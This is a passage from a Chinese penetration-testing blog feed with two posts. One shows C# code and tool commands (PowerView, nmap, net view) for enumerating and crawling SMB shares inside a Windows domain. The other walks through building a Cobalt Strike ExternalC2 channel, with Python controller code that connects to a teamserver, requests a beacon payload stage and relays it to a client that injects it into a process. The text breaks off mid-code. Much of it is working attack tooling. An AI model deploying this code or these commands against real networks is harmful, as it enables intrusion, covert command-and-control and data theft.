class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shi1_netname - ADMIN$</span><br><span class="line">shi1_remark - Remote management</span><br><span class="line">shi1_netname - C$</span><br><span class="line">shi1_remark -<span class="built_in"> Default </span>share</span><br><span class="line">shi1_netname - SYSVOL</span><br><span class="line">shi1_remark - Logon<span class="built_in"> server </span>share</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 返回指定计算机所开放的共享，并返回 SHARE_INFO_1[] 数组结构</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/netshareenum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="Server"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SHARE_INFO_1[] <span class="title">EnumNetShares</span>(<span class="params"><span class="keyword">string</span> Server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    List&lt;SHARE_INFO_1&gt; ShareInfos = <span class="keyword">new</span> List&lt;SHARE_INFO_1&gt;();</span><br><span class="line">    <span class="keyword">int</span> entriesread = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> totalentries = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> resume_handle = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> nStructSize = Marshal.SizeOf(<span class="keyword">typeof</span>(SHARE_INFO_1));</span><br><span class="line">    IntPtr bufPtr = IntPtr.Zero;</span><br><span class="line">    StringBuilder server = <span class="keyword">new</span> StringBuilder(Server);</span><br><span class="line">    <span class="keyword">int</span> ret = NetShareEnum(server, <span class="number">1</span>, <span class="keyword">ref</span> bufPtr, MAX_PREFERRED_LENGTH, <span class="keyword">ref</span> entriesread, <span class="keyword">ref</span> totalentries, <span class="keyword">ref</span> resume_handle);</span><br><span class="line">    <span class="keyword">if</span> (ret == NERR_Success)</span><br><span class="line">    &#123;</span><br><span class="line">        IntPtr currentPtr = bufPtr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; entriesread; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, <span class="keyword">typeof</span>(SHARE_INFO_1));</span><br><span class="line">            ShareInfos.Add(shi1);</span><br><span class="line">            currentPtr += nStructSize;</span><br><span class="line">        &#125;</span><br><span class="line">        NetApiBufferFree(bufPtr);</span><br><span class="line">        <span class="keyword">return</span> ShareInfos.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShareInfos.Add(<span class="keyword">new</span> SHARE_INFO_1(<span class="string">"ERROR="</span> + ret.ToString(), <span class="number">10</span>, <span class="keyword">string</span>.Empty));</span><br><span class="line">        <span class="keyword">return</span> ShareInfos.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>演示结果：</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-29-03.png" alt=""></p><h2 id="0X02-进一步拓展"><a href="#0X02-进一步拓展" class="headerlink" title="0X02 进一步拓展"></a>0X02 进一步拓展</h2><h3 id="2-1、判断是否可读"><a href="#2-1、判断是否可读" class="headerlink" title="2.1、判断是否可读"></a>2.1、判断是否可读</h3><p>判断可读，是根据当前用户权限进行判断的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> path = String.Format(<span class="string">"\\\\&#123;0&#125;\\&#123;1&#125;"</span>, computer, share.shi1_netname);</span><br><span class="line"><span class="keyword">var</span> files = System.IO.Directory.GetFiles(path);</span><br></pre></td></tr></table></figure><p>直接根据以上方法进行访问测试即可。效果如下</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-48-07.png" alt=""></p><p>接下来就是以当前权限，对可访问的共享进行遍历即可。获取文件名、文件大小，再进行下一步的筛选。</p><h3 id="2-2、遍历"><a href="#2-2、遍历" class="headerlink" title="2.2、遍历"></a>2.2、遍历</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 对路径进行遍历</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="info"&gt;</span>提供的根路径<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ListFiles</span>(<span class="params">FileSystemInfo info</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!info.Exists) <span class="keyword">return</span>;</span><br><span class="line">  DirectoryInfo dir = info <span class="keyword">as</span> DirectoryInfo;</span><br><span class="line">  <span class="comment">//不是目录</span></span><br><span class="line">  <span class="keyword">if</span> (dir == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    FileSystemInfo[] files = dir.GetFileSystemInfos();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; files.Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      FileInfo file = files[i] <span class="keyword">as</span> FileInfo;</span><br><span class="line">      <span class="comment">//是文件</span></span><br><span class="line">      <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        Console.WriteLine(file.FullName);</span><br><span class="line">      <span class="comment">//对于子目录，进行递归调用</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        ListFiles(files[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/【域渗透】获取域内机器共享/Blog_2019-10-16_22-27-27.png" alt=""></p><h2 id="0x03-现有工具"><a href="#0x03-现有工具" class="headerlink" title="0x03 现有工具"></a>0x03 现有工具</h2><ul><li>net 命令</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view \\ip # 查询指定<span class="built_in"> IP </span>共享</span><br><span class="line">net sharp # 查看<span class="built_in"> SMB </span>指向的路径[即共享]</span><br></pre></td></tr></table></figure><ul><li>Nmap</li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb-<span class="class"><span class="keyword">enum</span>-<span class="title">shares</span>.<span class="title">nse</span> <span class="comment"># 遍历远程主机的共享目录</span></span></span><br></pre></td></tr></table></figure><ul><li>nbtscan</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan <span class="number">192.10</span><span class="number">.20</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><ul><li>powerview</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-StealthUserHunter # 查找域中 domain admins 共享源机器(session <span class="keyword">from</span>)</span><br><span class="line">Invoke-Netview # 检索主机建立的共享会话</span><br><span class="line">Invoke-NetviewThreaded # 检索主机建立的共享会话</span><br><span class="line">Invoke-ShareFinder # 查找主机建立的共享会话</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【渗透技巧】Cobalt Strike 的 ExternalC2</title>
    <link href="https://rcoil.me/2019/10/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91Cobalt%20Strike%20%E7%9A%84%20ExternalC2/"/>
    <id>https://rcoil.me/2019/10/【渗透技巧】Cobalt Strike 的 ExternalC2/</id>
    <published>2019-10-27T05:21:16.000Z</published>
    <updated>2019-11-01T02:35:16.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><code>Cobalt Strike</code> 的上线问题归结为以下几点：</p><table><thead><tr><th style="text-align:center">问题</th><th style="text-align:center">解决方法</th></tr></thead><tbody><tr><td style="text-align:center">目标存在杀软（被杀）</td><td style="text-align:center">Shellcode 加载器</td></tr><tr><td style="text-align:center">目标存在杀软（拦截连接）</td><td style="text-align:center">C2 处理</td></tr><tr><td style="text-align:center">目标机是 Web 映射出网</td><td style="text-align:center">特殊 C2 处理</td></tr><tr><td style="text-align:center">隔离网络</td><td style="text-align:center">出网机器做跳板</td></tr></tbody></table><p>本文针对第 3 点进行展开。</p><a id="more"></a><h2 id="0x01-前置知识点"><a href="#0x01-前置知识点" class="headerlink" title="0x01 前置知识点"></a>0x01 前置知识点</h2><h3 id="1-1、管道"><a href="#1-1、管道" class="headerlink" title="1.1、管道"></a>1.1、管道</h3><p>如果对管道不熟悉的朋友，可以将管道理解为采用消息队列方式操作的文件。为什么说管道是文件呢？因为它的本质是一段系统内核的缓冲区，可以看做是一个伪文件。在我们使用管道时，需要 Create、Open、Read、Write、Close，就和我们操作文件差不多。而又为什么说管道是采用消息队列的方式呢？因为它实际上的数据结构是一个环形队列。不同的线程都可以向里面写，也可以从里面读。写在队列末尾，读就是从队列头部删除。</p><p>管道分为两种，匿名管道（pipe）和命名管道（FIFO）。匿名管道用于父子进程通信，而命名管道可以用于任意两个进程通信。</p><ul><li><p>服务端：创建管道 &gt;&gt; 监听 &gt;&gt; 读写 &gt;&gt; 关闭</p></li><li><p>客户端：打开命令管道，获得句柄 &gt;&gt; 写入数据 &gt;&gt; 等待回复</p></li></ul><h3 id="1-2、SMB-Beacon"><a href="#1-2、SMB-Beacon" class="headerlink" title="1.2、SMB Beacon"></a>1.2、SMB Beacon</h3><p>官网的解释为：<strong>SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。</strong> <code>SMB Beacon</code> 默认使用的是：<code>msagent_bb34</code></p><p>以上的说法，其实就是将 Payload 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。</p><h2 id="0x02-ExternalC2"><a href="#0x02-ExternalC2" class="headerlink" title="0x02 ExternalC2"></a>0x02 ExternalC2</h2><p><code>ExternalC2</code> 是 <code>Cobalt Strike</code> 引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 <code>HTTP(S)/DNS/SMB</code> 通道。大家可以参考<a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf" target="_blank" rel="noopener">此处</a>下载完整的规范说明。</p><p>简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：</p><ul><li><strong>第三方控制端（Controller）</strong>：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。</li><li><strong>第三方客户端（Client）</strong>：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。</li><li><strong>SMB Beacon</strong>：在受害者主机上执行的标准 beacon。</li></ul><p>从 <code>Cobalt Strike</code> 提供的官方文档中(文末有官方文档)，我们可以看到如下示意图：</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-09-30_10-57-10.png" alt=""></p><p>从上图可知，我们的自定义 C2 通道两端分别为<code>第三方 Controller</code> 以及<code>第三方 Client</code>，这两个角色都是我们可以研发以及控制的角色。往下走就是一个 完整的 <code>ExternalC2</code>工作流程</p><h2 id="0x03-正常的-ExternalC2-工作流程"><a href="#0x03-正常的-ExternalC2-工作流程" class="headerlink" title="0x03 正常的 ExternalC2 工作流程"></a>0x03 正常的 ExternalC2 工作流程</h2><p>一个粗糙的时序图（图中的空虚线是为了排版，无其他意义）：</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/ExternalC2.svg" alt=""></p><h3 id="3-1、ExternalC2"><a href="#3-1、ExternalC2" class="headerlink" title="3.1、ExternalC2"></a>3.1、ExternalC2</h3><p>我们需要让 <code>Cobalt Strike</code> 启动 <code>ExternalC2</code>。我们可以使用 <code>externalc2_start</code> 函数，传入端口参数即可。一旦 <code>ExternalC2</code> 服务顺利启动并正常运行，我们需要使用自定义的协议进行通信。</p><ul><li><p>启用 <code>externalc2_start</code> 函数，通知 <code>Teamserver</code> 已开启 <code>C2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">externalc2_start(<span class="string">"0.0.0.0"</span>, <span class="number">2222</span>);</span><br></pre></td></tr></table></figure></li><li><p>等待 <code>Controller</code> 连接传输配置信息</p></li><li><p>生成下发 <code>Payload Stage</code></p></li><li><p>接收和下发信息</p></li></ul><h3 id="3-2、Controller"><a href="#3-2、Controller" class="headerlink" title="3.2、Controller"></a>3.2、Controller</h3><ul><li><p>使用 <code>socket</code> 连接 <code>ExternalC2</code> 平台</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_socketToExternalC2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">_socketToExternalC3.connect((<span class="string">"193.10.20.123"</span>, <span class="number">2222</span>))</span><br></pre></td></tr></table></figure></li><li><p>规范接收与发送的数据格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFormat</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, len(data)) + data</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFormat</span><span class="params">(data)</span>:</span></span><br><span class="line">    len = struct.unpack(<span class="string">"&lt;I"</span>, data[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">    body = data[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> (len, body)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvFromExternalC2</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    _len =  _socketToExternalC3.recv(<span class="number">4</span>)</span><br><span class="line">    l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">        data += _socketToExternalC3.recv(l - len(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvFromBeacon</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    _len =  _socketToBeacon.recv(<span class="number">4</span>)</span><br><span class="line">    l = struct.unpack(<span class="string">"&lt;I"</span>,_len)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; l:</span><br><span class="line">        data += _socketToBeacon.recv(l - len(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure></li><li><p>发送配置选项（x86 or x64 、命名管道名称、间隔时间）</p></li><li><p>发送 <code>go</code>，通知 <code>ExternalC2</code> 可下发 <code>Payload Stage</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendToTS</span><span class="params">(data)</span>:</span></span><br><span class="line">    _socketToExternalC3.sendall(encodeFormat(data))</span><br><span class="line">    </span><br><span class="line">sendToTS(<span class="string">"arch=x86"</span>)</span><br><span class="line">sendToTS(“pipename=rcoil<span class="string">")</span></span><br><span class="line"><span class="string">sendToTS("</span>block=<span class="number">500</span><span class="string">")</span></span><br><span class="line"><span class="string">sendToTS("</span>go<span class="string">")</span></span><br></pre></td></tr></table></figure></li><li><p>接收来自 <code>ExternalC2</code> 所下发的 <code>Payload Stage</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> = recvFromExternalC2()</span></span><br></pre></td></tr></table></figure></li><li><p>与此同时，新开启一个 <code>Socket</code>，进行监听，等待接收来自 <code>Client (EXE)</code> 的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">_socketBeacon.bind((<span class="string">"0.0.0.0"</span>, <span class="number">8088</span>))</span><br><span class="line">_socketBeacon.listen(<span class="number">1</span>)</span><br><span class="line">_socketClient = _socketBeacon.accept()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li><li><p>在收到 <code>Client (EXE)</code> 的连接后，向 <code>Client (EXE)</code> 发送 <code>Payload Stage</code></p></li><li><p>向<code>ExternalC2</code> 反馈来自 <code>Client (EXE)</code> 的数据</p></li><li><p>机器上线</p></li><li><p>进入数据收发循环处理流程</p></li></ul><p>可以参考<a href="https://gist.github.com/xpn/bb82f2ca4c8e9866c12c54baeb64d771" target="_blank" rel="noopener">此处</a>获取完整的 <code>Controller</code> 代码。</p><h3 id="3-3、Client-EXE"><a href="#3-3、Client-EXE" class="headerlink" title="3.3、Client (EXE)"></a>3.3、Client (EXE)</h3><ul><li><p>同样规范接收与发送的数据格式</p></li><li><p>连接 <code>Controller</code>，并接收 <code>Payload Stage</code></p></li><li>将接收到的 <code>Payload Stage</code> 使用常规的<strong>进程注入</strong>方法注入到进程中</li><li><code>SMB Beacon</code>启动并处于运行状态</li><li><code>Client (EXE)</code> 连接 <code>SMB Beacon</code> 的命名管道，用于接收或下发命令</li><li>进入数据收发循环处理流程</li></ul><p>可以参考<a href="https://gist.github.com/xpn/08cf7001780020bb60c5c773cec5f839" target="_blank" rel="noopener">此处</a>获取完整的 <code>Client (EXE)</code> 代码</p><h2 id="0x04-特殊的-C2-配置"><a href="#0x04-特殊的-C2-配置" class="headerlink" title="0x04 特殊的 C2 配置"></a>0x04 特殊的 C2 配置</h2><p>以上所配置的 C2，并不能满足我们现在的特殊需求：<strong>Web 映射出网环境上线问题</strong> 。由于目标机是不出外网的，所以无法实现上面的： <strong>Client 主动连接 Controller，进而将 Payload Stage下发</strong>，所以可以从上面的流程进行修改，其实修改起来也不难，以下是解决方案：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要在目标机器上面（根据 Web 容器）编写一个对指定的命名管道进行读取和写入的脚本(<span class="built_in">Client</span>-Web)，然后在 Controller 上对此脚本(<span class="built_in">Client</span>-Web)进行连接（读写操作），将主动变成被动即可解决。</span><br></pre></td></tr></table></figure><p>为了省略阅读时长，直接看以下时序图（图中的空虚线是为了排版，无其他意义）。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/WebExternalC2.svg" alt=""></p><p>需要多一个中转设置，我们将这个中转命名为 <code>Client-Web</code>，确保自定义周期能够完成。接下来小节中的代码，如果是应用于实战，建议自写。</p><h3 id="4-1、Controller"><a href="#4-1、Controller" class="headerlink" title="4.1、Controller"></a>4.1、Controller</h3><p>这一部分与上所述基本一致，只是将挂起的 <code>socket</code> 转为对 <code>Web</code> 的请求，主动去获取数据，再将获取到的数据进行反馈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/controller/webc3.py</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># import random</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">PAYLOAD_MAX_SIZE = <span class="number">512</span> * <span class="number">1024</span></span><br><span class="line">BUFFER_MAX_SIZE = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcpconnect</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvdata_unpack</span><span class="params">(s)</span>:</span></span><br><span class="line">    chunk = s.recv(<span class="number">4</span>)</span><br><span class="line">    slen = struct.unpack(<span class="string">"&lt;I"</span>, chunk)[<span class="number">0</span>]</span><br><span class="line">    recvdata = s.recv(slen)</span><br><span class="line">    print(<span class="string">"recvdata_unpack: "</span> + str(slen))</span><br><span class="line">    <span class="comment"># print(recvdata)</span></span><br><span class="line">    <span class="keyword">return</span> recvdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">senddata_pack</span><span class="params">(s, data)</span>:</span></span><br><span class="line">    slen = struct.pack(<span class="string">"&lt;I"</span>, len(data))</span><br><span class="line">    s.sendall(slen+data)</span><br><span class="line">    print(<span class="string">"senddata_pack: "</span> + str(len(data)))</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">droppaylod</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="comment"># filename = random.choice(["a", "b", "c", "d"]) + str(random.randint(1000, 9999)) + ".bin"</span></span><br><span class="line">    filename = <span class="string">"payload.bin"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"payload/"</span> + filename, <span class="string">"wb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(data)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestpayload</span><span class="params">(s, arch, pipename, block)</span>:</span></span><br><span class="line">    senddata_pack(s, (<span class="string">"arch="</span> + arch).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    senddata_pack(s, (<span class="string">"pipename="</span> + pipename).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    senddata_pack(s, (<span class="string">"block="</span> + str(block)).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    senddata_pack(s, <span class="string">"go"</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment">#为什么必须这么写，原因需要深究</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(chunk) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> ()</span><br><span class="line">    slen = struct.unpack(<span class="string">'&lt;I'</span>, chunk)[<span class="number">0</span>]</span><br><span class="line">    chunk = s.recv(slen)</span><br><span class="line">    <span class="keyword">while</span> len(chunk) &lt; slen:</span><br><span class="line">        chunk = chunk + s.recv(slen - 